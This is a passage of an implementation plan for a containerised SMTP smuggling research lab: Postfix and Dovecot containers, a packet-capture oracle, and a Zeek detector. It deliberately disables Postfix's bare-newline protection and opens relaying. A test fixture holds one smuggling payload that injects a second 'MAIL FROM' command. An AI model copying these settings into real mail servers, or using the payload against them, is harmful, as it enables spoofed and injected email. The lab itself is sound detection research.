myhostname = postfix.labnet.test
mydomain = labnet.test
myorigin = $mydomain
inet_interfaces = all
inet_protocols = ipv4
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain

# --- The load-bearing line for smuggling reproduction ---
smtpd_forbid_bare_newline = no
smtpd_forbid_unauth_pipelining = no

# Deliver to local Maildir for the bob user
home_mailbox = Maildir/
mailbox_command =

# Relax restrictions so the lab harness can send without authentication
smtpd_relay_restrictions = permit_mynetworks permit
smtpd_recipient_restrictions = permit_mynetworks permit

# The labnet bridge will be in 10.89.0.0/24 or similar; allow the whole
# /8 so we don't fight Podman's address assignment.
mynetworks = 127.0.0.0/8 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16

# Logging
maillog_file = /var/log/mail.log
```

- [ ] **Step 3:** Create `lab/postfix/master.cf` (standard Debian default with one tweak so the SMTP daemon runs in the foreground for Podman):

```
# ==========================================================================
# service  type  private  unpriv  chroot  wakeup  maxproc  command + args
# ==========================================================================
smtp      inet  n         -       n       -       -        smtpd
pickup    unix  n         -       n       60      1        pickup
cleanup   unix  n         -       n       -       0        cleanup
qmgr      unix  n         -       n       300     1        qmgr
tlsmgr    unix  -         -       n       1000?   1        tlsmgr
rewrite   unix  -         -       n       -       -        trivial-rewrite
bounce    unix  -         -       n       -       0        bounce
defer     unix  -         -       n       -       0        bounce
trace     unix  -         -       n       -       0        bounce
verify    unix  -         -       n       -       1        verify
flush     unix  n         -       n       1000?   0        flush
proxymap  unix  -         -       n       -       -        proxymap
proxywrite unix -         -       n       -       1        proxymap
smtp      unix  -         -       n       -       -        smtp
relay     unix  -         -       n       -       -        smtp
showq     unix  n         -       n       -       -        showq
error     unix  -         -       n       -       -        error
retry     unix  -         -       n       -       -        error
discard   unix  -         -       n       -       -        discard
local     unix  -         n       n       -       -        local
virtual   unix  -         n       n       -       -        virtual
lmtp      unix  -         -       n       -       -        lmtp
anvil     unix  -         -       n       -       1        anvil
scache    unix  -         -       n       -       1        scache
```

- [ ] **Step 4:** Create `lab/postfix/entrypoint.sh`:

```bash
#!/bin/bash
set -euo pipefail

# Regenerate /etc/postfix/main.cf's dynamic entries
postfix set-permissions >/dev/null 2>&1 || true
postfix check

# Start rsyslog so Postfix has somewhere to log
service rsyslog start

# Start Postfix and tail the log in the foreground so the container stays alive
postfix start-fg &
POSTFIX_PID=$!

# Tail the log so logs appear in `podman logs`
touch /var/log/mail.log
tail -F /var/log/mail.log &
TAIL_PID=$!

trap "kill $POSTFIX_PID $TAIL_PID 2>/dev/null || true" TERM INT EXIT
wait $POSTFIX_PID
```

- [ ] **Step 5:** Build the image:

```bash
podman build -t smtp-lab-postfix:m0 lab/postfix/
```

Expected: builds without errors, ends with "Successfully tagged smtp-lab-postfix:m0".

- [ ] **Step 6:** Smoke-test the image by running it:

```bash
podman run --rm --security-opt seccomp=unconfined --name postfix-smoke -d -p 127.0.0.1:2525:25 smtp-lab-postfix:m0
sleep 3
podman logs postfix-smoke
echo | nc -w 2 127.0.0.1 2525 || true
podman stop postfix-smoke
```

Expected: `podman logs` shows "Postfix is running"; `nc` shows `220 postfix.labnet.test ESMTP Postfix`.

- [ ] **Step 7:** Commit:

```bash
git add lab/postfix/
git commit -m "lab: Postfix Containerfile on debian:12-slim with bare-newline allowed"
```

### Task E2: Dovecot Containerfile (LMTP-to-Maildir writer, no IMAP in M0)

**Files:**
- Create: `lab/dovecot/Containerfile`
- Create: `lab/dovecot/dovecot.conf`
- Create: `lab/dovecot/entrypoint.sh`

- [ ] **Step 1:** Create `lab/dovecot/Containerfile`:

```dockerfile
FROM debian:12-slim

RUN apt-get update \
    && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
        dovecot-core \
        dovecot-lmtpd \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash bob \
    && echo 'bob:labpass' | chpasswd \
    && mkdir -p /home/bob/Maildir \
    && chown -R bob:bob /home/bob

COPY dovecot.conf /etc/dovecot/dovecot.conf
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

EXPOSE 24
CMD ["/entrypoint.sh"]
```

- [ ] **Step 2:** Create `lab/dovecot/dovecot.conf` — minimal LMTP-to-Maildir configuration:

```
protocols = lmtp
listen = *
log_path = /dev/stderr
info_log_path = /dev/stderr

mail_location = maildir:/home/%u/Maildir

service lmtp {
  inet_listener lmtp {
    port = 24
  }
}

passdb {
  driver = passwd
}

userdb {
  driver = passwd
}

# Allow the lab harness to inspect delivered mail without needing IMAP
mail_privileged_group = mail
```

- [ ] **Step 3:** Create `lab/dovecot/entrypoint.sh`:

```bash
#!/bin/bash
set -euo pipefail
exec dovecot -F
```

- [ ] **Step 4:** Build and smoke-test:

```bash
podman build -t smtp-lab-dovecot:m0 lab/dovecot/
podman run --rm --security-opt seccomp=unconfined --name dovecot-smoke -d -p 127.0.0.1:2524:24 smtp-lab-dovecot:m0
sleep 2
podman logs dovecot-smoke
podman stop dovecot-smoke
```

Expected: Dovecot log shows "master: Dovecot v2.3.x starting up".

- [ ] **Step 5:** Commit:

```bash
git add lab/dovecot/
git commit -m "lab: Dovecot LMTP-to-Maildir writer on debian:12-slim"
```

### Task E3: tcpdump sidecar Containerfile

**Files:**
- Create: `lab/tcpdump-sidecar/Containerfile`
- Create: `lab/tcpdump-sidecar/entrypoint.sh`

- [ ] **Step 1:** Create `lab/tcpdump-sidecar/Containerfile`:

```dockerfile
FROM alpine:3.19

RUN apk add --no-cache tcpdump

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

CMD ["/entrypoint.sh"]
```

- [ ] **Step 2:** Create `lab/tcpdump-sidecar/entrypoint.sh`:

```bash
#!/bin/sh
set -e

PCAP_DIR="${PCAP_DIR:-/pcaps}"
IFACE="${IFACE:-eth0}"
FILTER="${FILTER:-port 25}"

mkdir -p "$PCAP_DIR"

# Rotate on case boundaries: the harness writes a trigger file named
# /pcaps/current-case.txt containing the case id. We spawn one tcpdump
# per case using that id as the filename.
CURRENT=""
while true; do
    if [ -f "$PCAP_DIR/current-case.txt" ]; then
        NEW=$(cat "$PCAP_DIR/current-case.txt")
        if [ "$NEW" != "$CURRENT" ]; then
            if [ -n "$CURRENT" ] && [ -n "$TCPDUMP_PID" ]; then
                kill "$TCPDUMP_PID" 2>/dev/null || true
                wait "$TCPDUMP_PID" 2>/dev/null || true
            fi
            CURRENT="$NEW"
            tcpdump -i "$IFACE" -s 0 -U -w "$PCAP_DIR/case-${CURRENT}.pcap" "$FILTER" &
            TCPDUMP_PID=$!
        fi
    fi
    sleep 0.2
done
```

- [ ] **Step 3:** Build:

```bash
podman build -t smtp-lab-tcpdump:m0 lab/tcpdump-sidecar/
```

Expected: builds without errors.

- [ ] **Step 4:** Commit:

```bash
git add lab/tcpdump-sidecar/
git commit -m "lab: tcpdump sidecar for per-case pcap capture"
```

### Task E4: podman-compose.yml for the M0 lab

**Files:**
- Create: `lab/podman-compose.yml`

- [ ] **Step 1:** Create `lab/podman-compose.yml`:

```yaml
version: "3.8"

networks:
  labnet:
    driver: bridge

volumes:
  pcaps:
  bob-maildir:

services:
  postfix-sender:
    image: smtp-lab-postfix:m0
    container_name: postfix-sender
    hostname: sender.labnet.test
    networks:
      - labnet
    security_opt:
      - "seccomp=unconfined"
    # Sender exposes 25 to the host harness on 127.0.0.1:2525
    ports:
      - "127.0.0.1:2525:25"

  postfix-receiver:
    image: smtp-lab-postfix:m0
    container_name: postfix-receiver
    hostname: receiver.labnet.test
    networks:
      - labnet
    security_opt:
      - "seccomp=unconfined"
    volumes:
      - bob-maildir:/home/bob/Maildir

  dovecot:
    image: smtp-lab-dovecot:m0
    container_name: dovecot
    hostname: dovecot.labnet.test
    networks:
      - labnet
    security_opt:
      - "seccomp=unconfined"
    volumes:
      - bob-maildir:/home/bob/Maildir

  tcpdump:
    image: smtp-lab-tcpdump:m0
    container_name: tcpdump-sidecar
    network_mode: "service:postfix-receiver"
    security_opt:
      - "seccomp=unconfined"
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - pcaps:/pcaps
    environment:
      - IFACE=eth0
      - FILTER=port 25
```

**Design notes baked into this file:**

- `postfix-sender` is the host-accessible SMTP endpoint on `127.0.0.1:2525`. The harness sends to `127.0.0.1:2525` and the sender forwards to `postfix-receiver` on `labnet`.
- `postfix-receiver` delivers locally. For M0 we *also* have Dovecot on the same Maildir volume, so M1 can add IMAP without re-plumbing.
- `tcpdump` shares the network namespace of `postfix-receiver` so it sees traffic arriving at the receiver's eth0. This is the cleanest way to capture "what the receiver actually saw on the wire."

- [ ] **Step 2:** Bring up the compose stack:

```bash
podman-compose -f lab/podman-compose.yml up -d
sleep 5
podman-compose -f lab/podman-compose.yml ps
```

Expected: all four services show `running`.

- [ ] **Step 3:** Smoke-test SMTP reachability:

```bash
python3 -c "
import socket
s = socket.create_connection(('127.0.0.1', 2525), timeout=5)
print(s.recv(4096))
s.sendall(b'QUIT\r\n')
print(s.recv(4096))
s.close()
"
```

Expected: `b'220 sender.labnet.test ESMTP Postfix ...'` then `b'221 ...'`.

- [ ] **Step 4:** Bring the stack down:

```bash
podman-compose -f lab/podman-compose.yml down
```

- [ ] **Step 5:** Commit:

```bash
git add lab/podman-compose.yml
git commit -m "lab: podman-compose.yml with postfix sender+receiver, dovecot, tcpdump"
```

### Task E5: Configure sender-to-receiver relay

**Files:**
- Modify: `lab/postfix/entrypoint.sh` (branch by `POSTFIX_ROLE` env var)
- Modify: `lab/podman-compose.yml` (add `POSTFIX_ROLE` env var to sender and receiver services)

The sender needs to know where to relay mail for the `labnet.test` domain. The receiver needs to accept it locally. Rather than build two images, the single Postfix image branches at startup on an env var `POSTFIX_ROLE=sender|receiver` and calls `postconf -e` to flip the relevant settings in place.

- [ ] **Step 1:** Edit `lab/postfix/entrypoint.sh` to select config by role:

```bash
#!/bin/bash
set -euo pipefail

ROLE="${POSTFIX_ROLE:-receiver}"

if [ "$ROLE" = "sender" ]; then
    postconf -e 'mydestination = $myhostname, localhost'
    postconf -e 'relayhost = [postfix-receiver]:25'
    postconf -e 'smtp_host_lookup = native'
    postconf -e 'disable_dns_lookups = yes'
elif [ "$ROLE" = "receiver" ]; then
    postconf -e 'mydestination = labnet.test, receiver.labnet.test, localhost'
fi

postfix set-permissions >/dev/null 2>&1 || true
postfix check

service rsyslog start

postfix start-fg &
POSTFIX_PID=$!
touch /var/log/mail.log
tail -F /var/log/mail.log &
TAIL_PID=$!

trap "kill $POSTFIX_PID $TAIL_PID 2>/dev/null || true" TERM INT EXIT
wait $POSTFIX_PID
```

- [ ] **Step 2:** Rebuild the image:

```bash
podman build -t smtp-lab-postfix:m0 lab/postfix/
```

- [ ] **Step 3:** Add `POSTFIX_ROLE` env var to both Postfix services in `lab/podman-compose.yml`. Edit the `postfix-sender` service block to add:

```yaml
    environment:
      - POSTFIX_ROLE=sender
```

And `postfix-receiver`:

```yaml
    environment:
      - POSTFIX_ROLE=receiver
```

- [ ] **Step 4:** Bring the stack up again and run an end-to-end delivery test using the unsmuggled baseline:

```bash
podman-compose -f lab/podman-compose.yml up -d
sleep 5
. .venv/bin/activate
python3 -c "
from harness.payloads import load_payloads
from harness.send import send_case
payloads = {p.id: p for p in load_payloads('payloads/payloads.yaml')}
send_case('127.0.0.1', 2525, 'alice@labnet.test', 'bob@labnet.test', payloads['A1'])
print('sent A1')
"
sleep 2
podman exec postfix-receiver ls -la /home/bob/Maildir/new/
```

Expected: `ls` shows at least one file (the delivered A1 baseline email).

- [ ] **Step 5:** Bring the stack down:

```bash
podman-compose -f lab/podman-compose.yml down
```

- [ ] **Step 6:** Commit:

```bash
git add lab/postfix/entrypoint.sh lab/podman-compose.yml
git commit -m "lab: sender/receiver role split via POSTFIX_ROLE env var"
```

---

## Phase F — Oracle Integration

### Task F1: Pcap parser — extract SMTP DATA bytes from a capture

**Files:**
- Create: `harness/oracle.py`
- Create: `tests/test_oracle.py`

- [ ] **Step 1:** Write `tests/test_oracle.py`. The test constructs a minimal pcap in memory using dpkt's `Writer`, then feeds it to the oracle and asserts the extracted SMTP body matches what we wrote:

```python
"""Oracle tests. Hand-build a pcap with a synthetic SMTP session,
run it through the oracle, and verify the extracted body bytes match
what we wrote."""
import io
from pathlib import Path

import dpkt
import pytest

from harness.oracle import extract_smtp_data_bytes, replay_against_stub
from lab.stub.stub_smtpd import StubSmtpd


def _build_pcap_with_smtp_session(body_bytes: bytes) -> bytes:
    """Return a pcap file's raw bytes containing one SMTP session where
    the DATA body is exactly body_bytes."""
    buf = io.BytesIO()
    writer = dpkt.pcap.Writer(buf)

    # Simulate one TCP stream from client (10.0.0.1:12345) to server
    # (10.0.0.2:25) containing a full SMTP transaction.
    client_ip = "10.0.0.1"
    server_ip = "10.0.0.2"
    client_port = 12345
    server_port = 25

    def pkt(src_ip, sport, dst_ip, dport, payload, flags=dpkt.tcp.TH_ACK, seq=1, ack=1):
        tcp = dpkt.tcp.TCP(
            sport=sport, dport=dport,
            seq=seq, ack=ack, flags=flags,
            off_x2=0x50,
        )
        tcp.data = payload
        ip = dpkt.ip.IP(
            src=bytes(map(int, src_ip.split('.'))),
            dst=bytes(map(int, dst_ip.split('.'))),
            p=dpkt.ip.IP_PROTO_TCP,
        )
        ip.data = tcp
        ip.len = 20 + 20 + len(payload)
        eth = dpkt.ethernet.Ethernet(
            src=b"\x00\x00\x00\x00\x00\x01",
            dst=b"\x00\x00\x00\x00\x00\x02",
            type=dpkt.ethernet.ETH_TYPE_IP,
        )
        eth.data = ip
        return bytes(eth)

    # Client sends: EHLO, MAIL FROM, RCPT TO, DATA, <body>, QUIT
    commands = [
        b"EHLO harness.test\r\n",
        b"MAIL FROM:<a@a.test>\r\n",
        b"RCPT TO:<b@b.test>\r\n",
        b"DATA\r\n",
        body_bytes,
        b"QUIT\r\n",
    ]
    seq = 1
    for payload in commands:
        writer.writepkt(pkt(client_ip, client_port, server_ip, server_port, payload, seq=seq))
        seq += len(payload)

    writer.close()
    return buf.getvalue()


def test_extract_smtp_data_from_synthetic_pcap(tmp_path):
    body = b"Subject: test\r\n\r\nhello\r\n.\r\n"
    pcap_bytes = _build_pcap_with_smtp_session(body)
    pcap_path = tmp_path / "case.pcap"
    pcap_path.write_bytes(pcap_bytes)

    extracted = extract_smtp_data_bytes(pcap_path)
    # The extracted bytes should contain at minimum the body we placed
    # after DATA (it may also contain the EHLO / MAIL FROM / RCPT TO
    # depending on how we scope extraction; the contract is that body
    # bytes are in the returned blob byte-for-byte).
    assert body in extracted


@pytest.mark.asyncio
async def test_replay_against_stub_produces_expected_events(tmp_path):
    body = (
        b"Subject: one\r\n"
        b"\r\n"
        b"line\r\n"
        b".\r\n"
    )
    pcap_bytes = _build_pcap_with_smtp_session(body)
    pcap_path = tmp_path / "case.pcap"
    pcap_path.write_bytes(pcap_bytes)

    events_path = tmp_path / "events.jsonl"
    stub = StubSmtpd("127.0.0.1", 2550, events_path)
    await stub.start()
    try:
        event_count = await replay_against_stub(
            pcap_path, stub_host="127.0.0.1", stub_port=2550
        )
    finally:
        await stub.stop()
    assert event_count == 1
```

- [ ] **Step 2:** Run the test and confirm it fails:

```bash
pytest tests/test_oracle.py -v
```

Expected: ImportError on `harness.oracle`.

- [ ] **Step 3:** Implement `harness/oracle.py`:

```python
"""Pcap-to-stub oracle.

Reads a pcap captured on labnet, extracts the client->server TCP
payload for the SMTP port (25), and replays those raw bytes to the
stub SMTP receiver. The stub's event count is the ground truth for
'how many emails did the receiver see?'
"""
from __future__ import annotations

import asyncio
import json
import socket
from pathlib import Path

import dpkt


def extract_smtp_data_bytes(pcap_path: Path, server_port: int = 25) -> bytes:
    """Reassemble the client->server byte stream for TCP connections
    to `server_port`. Returns the concatenated payload across all
    such packets in capture order.

    Note: this is a simple in-order concatenation, not full TCP stream
    reassembly. For the lab (one client, no packet loss, no reordering)
    this is sufficient. If we ever see out-of-order packets in a real
    pcap, we'd need dpkt's TCP reassembly helpers.
    """
    buf = bytearray()
    with open(pcap_path, "rb") as f:
        for _ts, pkt in dpkt.pcap.Reader(f):
            try:
                eth = dpkt.ethernet.Ethernet(pkt)
            except Exception:
                continue
            ip = eth.data
            if not isinstance(ip, dpkt.ip.IP):
                continue
            tcp = ip.data
            if not isinstance(tcp, dpkt.tcp.TCP):
                continue
            if tcp.dport != server_port:
                continue
            if tcp.data:
                buf.extend(tcp.data)
    return bytes(buf)


async def replay_against_stub(
    pcap_path: Path,
    stub_host: str = "127.0.0.1",
    stub_port: int = 2540,
) -> int:
    """Replay the client->server SMTP bytes from `pcap_path` against
    a running stub and return the count of data_complete events the
    stub recorded."""
    raw = extract_smtp_data_bytes(pcap_path)

    # Read current event count before replay
    # (The stub's events_path is not directly accessible here — but
    # the count difference is what matters.)
    def _send():
        with socket.create_connection((stub_host, stub_port), timeout=10) as sock:
            sock.sendall(raw)
            sock.shutdown(socket.SHUT_WR)
            try:
                while sock.recv(4096):
                    pass
            except socket.timeout:
                pass

    await asyncio.to_thread(_send)
    # Give the stub a moment to flush to disk
    await asyncio.sleep(0.2)
    return -1  # event count must be read from stub.events_path by caller


def count_data_complete_events(events_path: Path) -> int:
    """Parse the stub's jsonl event log and return the count of
    data_complete events."""
    if not events_path.exists():
        return 0
    count = 0
    for line in events_path.read_text().splitlines():
        if not line.strip():
            continue
        try:
            evt = json.loads(line)
        except json.JSONDecodeError:
            continue
        if evt.get("type") == "data_complete":
            count += 1
    return count
```

- [ ] **Step 4:** Update `tests/test_oracle.py` — the replay test should use `count_data_complete_events` for the count assertion. Edit the test function:

```python
@pytest.mark.asyncio
async def test_replay_against_stub_produces_expected_events(tmp_path):
    body = (
        b"Subject: one\r\n"
        b"\r\n"
        b"line\r\n"
        b".\r\n"
    )
    pcap_bytes = _build_pcap_with_smtp_session(body)
    pcap_path = tmp_path / "case.pcap"
    pcap_path.write_bytes(pcap_bytes)

    events_path = tmp_path / "events.jsonl"
    stub = StubSmtpd("127.0.0.1", 2550, events_path)
    await stub.start()
    try:
        await replay_against_stub(
            pcap_path, stub_host="127.0.0.1", stub_port=2550
        )
    finally:
        await stub.stop()
    from harness.oracle import count_data_complete_events
    assert count_data_complete_events(events_path) == 1
```

- [ ] **Step 5:** Run tests:

```bash
pytest tests/test_oracle.py -v
```

Expected: 2 tests passed.

- [ ] **Step 6:** Commit:

```bash
git add harness/oracle.py tests/test_oracle.py
git commit -m "harness: pcap -> stub replay oracle"
```

### Task F2: Single-case orchestrator `run_case.py`

**Files:**
- Create: `harness/run_case.py`

Ties everything together: sets the tcpdump sidecar's current-case marker, sends the case through the real lab, waits for the pcap to stabilize, replays it through the stub, inspects the Dovecot Maildir, and returns a `CaseResult`.

- [ ] **Step 1:** Write `harness/run_case.py`:

```python
"""Single-case orchestrator. Runs one payload through the live lab
and captures all four ground-truth channels."""
from __future__ import annotations

import asyncio
import subprocess
import time
from dataclasses import dataclass, asdict
from pathlib import Path

from harness.oracle import count_data_complete_events, replay_against_stub
from harness.payloads import Payload
from harness.send import send_case
from lab.stub.stub_smtpd import StubSmtpd


@dataclass
class CaseResult:
    case_id: str
    payload_id: str
    pair: str
    wire_pcap_path: str
    stub_event_count: int
    maildir_file_count: int
    classification: str  # "vulnerable" | "sanitized-by-sender" | "rejected" | "baseline-ok"


def _maildir_count_via_podman(container: str, user: str = "bob") -> int:
    """Count files in /home/<user>/Maildir/new inside the container."""
    result = subprocess.run(
        ["podman", "exec", container, "sh", "-c", f"ls /home/{user}/Maildir/new 2>/dev/null | wc -l"],
        capture_output=True,
        text=True,
        check=False,
    )
    try:
        return int(result.stdout.strip() or "0")
    except ValueError:
        return 0


def _set_tcpdump_case_marker(case_id: str) -> None:
    """Write the current-case marker the tcpdump sidecar watches."""
    subprocess.run(
        ["podman", "exec", "tcpdump-sidecar", "sh", "-c", f"echo {case_id} > /pcaps/current-case.txt"],
        check=True,
    )


def _copy_pcap_out(case_id: str, dest: Path) -> None:
    """Copy the captured pcap from the tcpdump container volume to the host."""
    dest.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run(
        ["podman", "cp", f"tcpdump-sidecar:/pcaps/case-{case_id}.pcap", str(dest)],
        check=True,
    )


async def run_case(
    case_id: str,
    payload: Payload,
    sender_host: str = "127.0.0.1",
    sender_port: int = 2525,
    envelope_from: str = "alice@labnet.test",
    envelope_to: str = "bob@labnet.test",
    results_dir: Path = Path("results"),
) -> CaseResult:
    # 1. Reset Maildir before the case so file count is case-scoped
    subprocess.run(
        ["podman", "exec", "postfix-receiver", "sh", "-c", "rm -f /home/bob/Maildir/new/*"],
        check=False,
    )
    pre_count = _maildir_count_via_podman("postfix-receiver")

    # 2. Mark the tcpdump case id
    _set_tcpdump_case_marker(case_id)
    # Give tcpdump a moment to rotate
    time.sleep(0.5)

    # 3. Send the case
    await asyncio.to_thread(
        send_case,
        sender_host, sender_port,
        envelope_from, envelope_to,
        payload,
    )

    # 4. Wait for the receiver to fully process / deliver
    time.sleep(2.0)

    # 5. Copy the pcap out of the tcpdump volume
    pcap_dest = results_dir / "pcaps" / f"case-{case_id}.pcap"
    _copy_pcap_out(case_id, pcap_dest)

    # 6. Replay through the stub
    events_path = results_dir / "stub-events" / f"case-{case_id}.jsonl"
    events_path.parent.mkdir(parents=True, exist_ok=True)
    stub = StubSmtpd("127.0.0.1", 2560, events_path)
    await stub.start()
    try:
        await replay_against_stub(pcap_dest, stub_host="127.0.0.1", stub_port=2560)
    finally:
        await stub.stop()
    stub_count = count_data_complete_events(events_path)

    # 7. Inspect Maildir
    maildir_count = _maildir_count_via_podman("postfix-receiver") - pre_count

    # 8. Classify
    if payload.family == "baseline":
        classification = "baseline-ok" if (stub_count == 1 and maildir_count == 1) else "baseline-broken"
    elif stub_count > 1:
        classification = "vulnerable"
    elif stub_count == 1 and maildir_count <= 1:
        classification = "sanitized-by-sender"
    else:
        classification = "rejected"

    return CaseResult(
        case_id=case_id,
        payload_id=payload.id,
        pair="postfix->postfix",
        wire_pcap_path=str(pcap_dest),
        stub_event_count=stub_count,
        maildir_file_count=maildir_count,
        classification=classification,
    )
```

- [ ] **Step 2:** Smoke test — bring the lab up, run A1, assert `baseline-ok`:

```bash
podman-compose -f lab/podman-compose.yml up -d
sleep 5
. .venv/bin/activate
python3 -c "
import asyncio
from harness.payloads import load_payloads
from harness.run_case import run_case
payloads = {p.id: p for p in load_payloads('payloads/payloads.yaml')}
result = asyncio.run(run_case('smoke-a1', payloads['A1']))
print(result)
assert result.classification == 'baseline-ok', f'expected baseline-ok, got {result.classification}'
print('OK')
"
podman-compose -f lab/podman-compose.yml down
```

Expected: `CaseResult(...)` printed, classification `baseline-ok`, `OK` printed.

- [ ] **Step 3:** Commit:

```bash
git add harness/run_case.py
git commit -m "harness: single-case orchestrator with classification"
```

---

## Phase G — Zeek Detector

### Task G1: Install Zeek (user action)

Zeek is not a pip package and is not in Debian's default repos in a working version. The cleanest install path is the official Zeek binary packages from `software.opensuse.org/download/package?project=security:zeek`.

- [ ] **Step 1:** Install Zeek via the official Kali-compatible package:

```bash
sudo apt-get update
sudo apt-get install -y curl gnupg
echo 'deb http://download.opensuse.org/repositories/security:/zeek/Debian_12/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list
curl -fsSL https://download.opensuse.org/repositories/security:zeek/Debian_12/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg > /dev/null
sudo apt-get update
sudo apt-get install -y zeek
```

- [ ] **Step 2:** Verify Zeek is on PATH (it installs under /opt/zeek/bin by default):

```bash
export PATH="/opt/zeek/bin:$PATH"
zeek --version
```

Expected: `zeek version 6.x.x`. Add `export PATH="/opt/zeek/bin:$PATH"` to your shell rc if it isn't there.

- [ ] **Step 3:** Run the built-in smoke test:

```bash
zeek -e 'event zeek_init() { print "zeek ok"; }'
```

Expected: `zeek ok`.

This task has no code to commit.

### Task G2: Smoke pcap — hand-craft a pcap with a bare-LF payload

**Files:**
- Create: `tests/fixtures/build_smoke_pcap.py`
- Create: `tests/fixtures/smoke-a2.pcap` (generated, committed)

- [ ] **Step 1:** Create `tests/fixtures/build_smoke_pcap.py`:

```python
"""Build a minimal pcap containing one SMTP session with a bare-LF dot
bare-LF smuggling attempt. Used as a deterministic fixture for the
Zeek script smoke test."""
from __future__ import annotations

import io
import sys
from pathlib import Path

import dpkt


def build(output_path: Path) -> None:
    buf = io.BytesIO()
    writer = dpkt.pcap.Writer(buf)

    def pkt(src_ip, sport, dst_ip, dport, payload, seq):
        tcp = dpkt.tcp.TCP(
            sport=sport, dport=dport,
            seq=seq, ack=1,
            flags=dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
            off_x2=0x50,
        )
        tcp.data = payload
        ip = dpkt.ip.IP(
            src=bytes(map(int, src_ip.split('.'))),
            dst=bytes(map(int, dst_ip.split('.'))),
            p=dpkt.ip.IP_PROTO_TCP,
        )
        ip.data = tcp
        ip.len = 20 + 20 + len(payload)
        eth = dpkt.ethernet.Ethernet(
            src=b"\x00\x00\x00\x00\x00\x01",
            dst=b"\x00\x00\x00\x00\x00\x02",
            type=dpkt.ethernet.ETH_TYPE_IP,
        )
        eth.data = ip
        return bytes(eth)

    commands = [
        b"EHLO smoke.test\r\n",
        b"MAIL FROM:<a@a.test>\r\n",
        b"RCPT TO:<b@b.test>\r\n",
        b"DATA\r\n",
        b"Subject: smoke\r\n\r\nbody\n.\nMAIL FROM:<evil@evil.test>\r\n",
        b".\r\n",
        b"QUIT\r\n",
    ]
    seq = 1
    for payload in commands:
        writer.writepkt(pkt("10.0.0.1", 40000, "10.0.0.2", 25, payload, seq))
        seq += len(payload)

    writer.close()
    output_path.write_bytes(buf.getvalue())


if __name__ == "__main__":
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "tests/fixtures/smoke-a2.pcap")
    out.parent.mkdir(parents=True, exist_ok=True)
    build(out)
    print(f"wrote {out}")
```

- [ ] **Step 2:** Generate and commit the fixture:

```bash
. .venv/bin/activate
python tests/fixtures/build_smoke_pcap.py tests/fixtures/smoke-a2.pcap
ls -la tests/fixtures/
```

Expected: `smoke-a2.pcap` exists, a few hundred bytes.

- [ ] **Step 3:** Commit both the generator and the fixture:

```bash
git add tests/fixtures/build_smoke_pcap.py tests/fixtures/smoke-a2.pcap
git commit -m "tests: smoke pcap fixture with bare-LF smuggling attempt"
```

### Task G3: Minimal Zeek script that prints SMTP body bytes

**Files:**
- Create: `detect/gateway/smtp-smuggling.zeek`

- [ ] **Step 1:** Create `detect/gateway/smtp-smuggling.zeek`:

```
##! SMTP smuggling detection.
##!
##! Hooks the SMTP analyzer's DATA event, accumulates raw body bytes
##! per connection, and scans for parser-ambiguous byte patterns
##! around a dot that indicate an attempt to split the DATA stream.
##!
##! Generic-by-construction: detects the vulnerability class, not
##! just the 13 paper payloads.

@load base/protocols/smtp

module SMTPSmuggling;

export {
    redef enum Notice::Type += {
        Parser_Differential_Pattern,
    };
}

# Per-connection body byte buffer
global body_buf: table[string] of string = table();

event zeek_init()
    {
    print "smtp-smuggling.zeek loaded";
    }

event smtp_data(c: connection, is_orig: bool, data: string)
    {
    if ( ! is_orig )
        return;
    local key = fmt("%s", c$uid);
    if ( key !in body_buf )
        body_buf[key] = "";
    body_buf[key] += data;
    }

event connection_state_remove(c: connection)
    {
    local key = fmt("%s", c$uid);
    if ( key !in body_buf )
        return;
    local body = body_buf[key];
    delete body_buf[key];

    # Byte-level pattern check. We look for any of:
    #   \n.\n    (bare LF dot bare LF)
    #   \r.\r    (bare CR dot bare CR)
    #   \r\n.\n  (CRLF dot bare LF)
    #   \n.\r\n  (bare LF dot CRLF)
    #   \x00 within 3 bytes of a dot preceded by any line terminator
    #
    # Note: Zeek's string type is byte-safe despite its name, so these
    # comparisons are byte-exact.
    local patterns: vector of string = vector(
        "\x0a.\x0a",
        "\x0d.\x0d",
        "\x0d\x0a.\x0a",
        "\x0a.\x0d\x0a"
    );

    for ( i in patterns )
        {
        if ( patterns[i] in body )
            {
            NOTICE([
                $note=Parser_Differential_Pattern,
                $msg=fmt("SMTP smuggling pattern detected: pattern index %d", i),
                $conn=c,
                $identifier=cat(c$uid, i),
            ]);
            return;
            }
        }
    }
```

- [ ] **Step 2:** Run Zeek on the smoke pcap:

```bash
export PATH="/opt/zeek/bin:$PATH"
mkdir -p results/zeek-work
cd results/zeek-work
zeek -r ../../tests/fixtures/smoke-a2.pcap ../../detect/gateway/smtp-smuggling.zeek
ls -la
cat notice.log 2>/dev/null || echo "no notice.log"
cd -
```

Expected: `results/zeek-work/` contains `conn.log`, `smtp.log`, `notice.log`. `notice.log` has a row with `SMTPSmuggling::Parser_Differential_Pattern`.

- [ ] **Step 3:** If Zeek raised the notice, commit:

```bash
git add detect/gateway/smtp-smuggling.zeek
git commit -m "detect: Zeek script detecting parser-ambiguous dot sequences"
```

- [ ] **Step 4:** If Zeek did NOT raise the notice — don't panic, this is the expected failure mode for first-time Zeek users. The most common causes:
  - `smtp_data` event signature wrong for your Zeek version — check `zeek --help-events | grep smtp_data`.
  - The `$uid` accessor is missing — replace with `c$uid` vs `c$id` depending on version.
  - The `body_buf` table needs `&default=""` rather than an if-check.

If stuck for more than 20 minutes, skip ahead to Task G5 (fallback Python SMTP proxy detector) and flag this task as a known deviation in `docs/status.md`.

### Task G4: pytest wrapper around the Zeek run

**Files:**
- Create: `tests/test_zeek_smoke.py`

- [ ] **Step 1:** Create `tests/test_zeek_smoke.py`:

```python
"""Zeek script smoke test. Runs Zeek on the fixture pcap and asserts
that the notice log contains the parser-differential pattern notice."""
import os
import subprocess
from pathlib import Path

import pytest


ZEEK = "/opt/zeek/bin/zeek"


